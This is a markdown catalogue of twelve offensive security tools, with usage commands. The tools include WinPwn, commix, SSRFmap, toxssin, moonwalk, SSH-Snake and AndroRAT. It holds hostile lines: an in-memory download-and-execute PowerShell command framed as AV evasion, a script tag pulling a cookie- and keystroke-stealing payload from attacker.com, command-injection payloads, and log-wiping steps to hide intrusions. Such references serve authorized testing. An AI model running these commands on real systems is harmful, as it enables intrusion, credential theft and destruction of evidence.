# Offensive Security Frameworks & Tools

Post-exploitation frameworks, attack automation, web exploitation, RATs, and specialized offensive utilities. All content is for authorized penetration testing and educational research only.

---

## Table of Contents
1. [fsociety](#1-fsociety)
2. [AutoSploit](#2-autosploit)
3. [WinPwn](#3-winpwn)
4. [commix](#4-commix)
5. [SSRFmap](#5-ssrfmap)
6. [fuxploider](#6-fuxploider)
7. [toxssin](#7-toxssin)
8. [moonwalk](#8-moonwalk)
9. [SSH-Snake](#9-ssh-snake)
10. [AndroRAT](#10-androrat)
11. [XAttacker](#11-xattacker)
12. [agency-agents](#12-agency-agents)

---

## 1. fsociety

- **Repository:** https://github.com/Manisso/fsociety
- **Type:** All-in-one hacking toolkit menu (Mr. Robot inspired)
- **Language:** Python 3

A menu-driven launcher wrapping many popular security tools — useful for beginners exploring available tools category by category without having to remember individual commands.

### Modules

| Category | Tools |
|----------|-------|
| Information Gathering | Nmap, Recon-ng, theHarvester, Sherlock |
| Password Attacks | Hashcat, John, Hydra, Crunch |
| Wireless | Aircrack-ng, Wifite, Wireshark |
| Web Hacking | Nikto, SQLmap, WPScan, XSSer |
| Exploitation | Metasploit, RouterSploit |
| Social Engineering | SET, BeEF |
| Sniffing & Spoofing | Wireshark, Ettercap |
| Post Exploitation | Empire, Weevely |
| Forensics | Binwalk, Foremost, Volatility |
| Reverse Engineering | Apktool, dex2jar |

```bash
git clone https://github.com/Manisso/fsociety.git
cd fsociety
pip3 install -r requirements.txt
python3 fsociety.py
```

---

## 2. AutoSploit

- **Repository:** https://github.com/NullArray/AutoSploit
- **License:** MIT
- **Type:** Automated mass exploitation (Shodan + Metasploit)
- **Language:** Python 3

AutoSploit queries Shodan for hosts running vulnerable services, then automatically attempts matching Metasploit exploit modules against the gathered targets.

```bash
git clone https://github.com/NullArray/AutoSploit.git
cd AutoSploit
pip3 install -r requirements.txt
# Requires: Metasploit Framework (msfrpcd), Shodan API key
python3 autosploit.py
```

**Workflow:**
1. Query Shodan for targets matching a service/version string
2. Load matching Metasploit exploit modules
3. Attempt exploitation in batch
4. Manage successful sessions

---

## 3. WinPwn

- **Repository:** https://github.com/S3cur3Th1sSh1t/WinPwn
- **License:** BSD-3-Clause
- **Type:** Windows post-exploitation PowerShell automation
- **Language:** PowerShell

WinPwn automates Windows internal recon and post-exploitation — privilege escalation enumeration, credential harvesting, lateral movement, and AMSI/Defender bypass.

```powershell
# Load from memory (bypasses file-based AV detection)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')

Invoke-WinPwn -Recon -PrivEsc -Credentials
```

**Feature categories:**
- **Recon:** Network, domain, user, shares enumeration
- **PrivEsc:** PowerUp, PrivescCheck, WINspect
- **Credentials:** Mimikatz, LaZagne, DPAPI, Kerberoasting
- **Defense Evasion:** AMSI bypass, Defender evasion, logging bypass
- **Lateral Movement:** SMB, WMI, Pass-the-Hash/Ticket

---

## 4. commix

- **Repository:** https://github.com/commixproject/commix
- **License:** GNU GPL v3
- **Type:** Automated command injection exploitation
- **Language:** Python 3
- **Stars:** 4k+

Automated detection and exploitation of OS command injection vulnerabilities in web applications.

### Injection Techniques

| Technique | Method |
|-----------|--------|
| Classic | Direct: `; id; #` |
| Timebased | Blind via `sleep` delays |
| File-based | Write output to file, retrieve |
| DNS-based | Exfiltrate via DNS lookups |

```bash
git clone https://github.com/commixproject/commix.git
python3 commix.py --url "http://target.com/page?cmd=id"

# POST data
python3 commix.py --url "http://target.com/" --data "cmd=id" --param "cmd"

# Interactive shell
python3 commix.py --url "http://target.com/page?cmd=id" --os-shell

# With Burp proxy
python3 commix.py --url "..." --proxy "http://127.0.0.1:8080"
```

---

## 5. SSRFmap

- **Repository:** https://github.com/swisskyrepo/SSRFmap
- **License:** MIT
- **Type:** SSRF vulnerability exploitation tool
- **Language:** Python 3

Automates SSRF detection and exploitation with modules for cloud metadata, internal service access, and protocol abuse.

### Modules

| Module | Target |
|--------|--------|
| aws | EC2 metadata (169.254.169.254) |
| gcp | Google Cloud metadata |
| azure | Azure metadata endpoint |
| redis | SSRF → Redis → RCE |
| fastcgi | FastCGI → RCE |
| mysql | MySQL via Gopher |
| portscan | Internal network enumeration |
| smtp | Internal SMTP relay |

```bash
git clone https://github.com/swisskyrepo/SSRFmap.git
pip3 install -r requirements.txt

# request.txt = raw HTTP request with SSRF parameter
python3 ssrfmap.py -r request.txt -p url -m aws
python3 ssrfmap.py -r request.txt -p url -m redis --lhost 10.0.0.1 --lport 4444
python3 ssrfmap.py -r request.txt -p url -m portscan
```

---

## 6. fuxploider

- **Repository:** https://github.com/almandin/fuxploider
- **License:** MIT
- **Type:** File upload vulnerability scanner and exploiter
- **Language:** Python 3

Automates finding and exploiting unrestricted file upload vulnerabilities — tests extension bypasses, MIME type bypasses, double extensions, and null byte injection.

```bash
git clone https://github.com/almandin/fuxploider.git
pip3 install -r requirements.txt

python3 fuxploider.py \
  --url http://target.com/upload \
  --not-regex "Upload failed" \
  --cookies "session=abc123"
```

**Bypasses tested:** `.php5`, `.phtml`, `.php.jpg`, null bytes, MIME type spoofing, content detection bypass.

---

## 7. toxssin

- **Repository:** https://github.com/t3l3machus/toxssin
- **License:** MIT
- **Type:** XSS exploitation framework
- **Language:** Python 3 + JavaScript

HTTPS server + JavaScript payload for exploiting XSS. Captures cookies, keystrokes, credentials, and enables JavaScript command execution in compromised browsers.

```bash
git clone https://github.com/t3l3machus/toxssin.git
pip3 install -r requirements.txt

python3 toxssin.py -u https://attacker.com -p 443 -c cert.pem -k key.pem
# Inject: <script src="https://attacker.com/toxssin.js"></script>
```

**Capabilities:** Session hijacking, keylogging, form capture, canvas screenshot, multi-victim management.

---

## 8. moonwalk

- **Repository:** https://github.com/mufeedvh/moonwalk
- **License:** MIT
- **Type:** Post-exploitation log cleaner / cover tracks
- **Language:** Rust

Session-based cover tracks tool for Linux. Records pre-session log state, then restores it after activity — clearing shell history, auth logs, wtmp/utmp, and login records.

```bash
cargo install moonwalk   # or download binary

moonwalk start           # Before pentest activity — snapshot log state
# ... do pentest work ...
moonwalk finish          # Restore pre-session log state
```

**Cleans:** `~/.bash_history`, `/var/log/auth.log`, `wtmp`, `utmp`, `lastlog`, SSH records.

---

## 9. SSH-Snake

- **Repository:** https://github.com/MegaManSec/SSH-Snake
- **Author:** MegaManSec (Joshua Rogers)
- **License:** MIT
- **Type:** Self-propagating SSH network traversal
- **Language:** Bash (single script, no dependencies)

SSH-Snake discovers SSH keys and agent sockets on a host, finds SSH targets (known_hosts, history, configs), and propagates itself through the network using found credentials — mapping SSH lateral movement paths.

```bash
bash Snake.nocomments.sh
# Output: JSON connectivity graph
# { "from": "10.0.0.1", "to": "10.0.0.5", "key": "~/.ssh/id_rsa" }
```

**Discovery sources:** `~/.ssh/`, `/etc/ssh/`, SSH agent sockets, `known_hosts`, `bash_history`, `~/.ssh/config`, `/etc/hosts`.

---

## 10. AndroRAT

- **Repository:** https://github.com/The404Hacking/AndroRAT
- **Type:** Android Remote Administration Tool
- **Language:** Java

One of the earliest Android RATs — remote access to camera, microphone, SMS, GPS, contacts, call logs, and file system. Originally a university project, now documented for defensive awareness.

> **Legal note:** Installing on devices without consent is a serious crime in all jurisdictions.

**Capabilities:** Live camera/mic stream, SMS read/send, GPS tracking, file manager, remote shell, contact and app enumeration.

---

## 11. XAttacker

- **Repository:** https://github.com/Moham3dRiahi/XAttacker
- **License:** MIT
- **Type:** Multi-CMS vulnerability scanner and auto-exploiter
- **Language:** Perl

Automates vulnerability detection and exploitation across CMS platforms — WordPress, Joomla, Drupal, OpenCart, Magento, PrestaShop.

```bash
git clone https://github.com/Moham3dRiahi/XAttacker.git
perl XAttacker.pl
```

**Tests for:** SQLi, RFI, XSS, arbitrary file upload, and known CVEs in popular CMS plugins and themes.

---

## 12. agency-agents

- **Repository:** https://github.com/msitarzewski/agency-agents
- **Type:** Multi-agent AI framework
- **Language:** Node.js

Modular framework for chaining LLM-powered agents for complex multi-step tasks. Used in security automation for reconnaissance pipelines, vulnerability triage, and report generation.

```bash
git clone https://github.com/msitarzewski/agency-agents.git
npm install
# Configure API keys, define agent workflows in YAML/JSON
node index.js
```

**Architecture:** Orchestrator agent spawns specialized sub-agents (research, analysis, code, reporting) and passes context between them.

---

## See Also

- [Exploit Development](exploit-development.md) — Binary exploitation, MBE course, kernel exploitation
- [Active Directory](active-directory.md) — AD attack cheat sheet
- [Web Application Security](web-application-security.md) — OWASP Top 10, Burp Suite
- [Penetration Testing Tools](penetration-testing-tools.md) — Metasploit, Nmap, Hashcat
